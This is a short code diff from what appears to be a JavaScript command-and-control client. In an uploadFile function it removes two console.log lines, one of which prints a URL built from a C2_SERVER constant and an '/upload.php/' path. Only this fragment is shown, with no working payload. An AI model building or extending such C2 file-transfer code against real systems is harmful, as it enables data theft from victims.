@@ -56,8 +56,6 @@ function uploadFile(file) {
         });
 
         res.on('end', () => {
-            console.log(`${C2_SERVER}/upload.php/${file}`);
-            console.log(data);
             const base64String = data;
             const filePath = file;
 
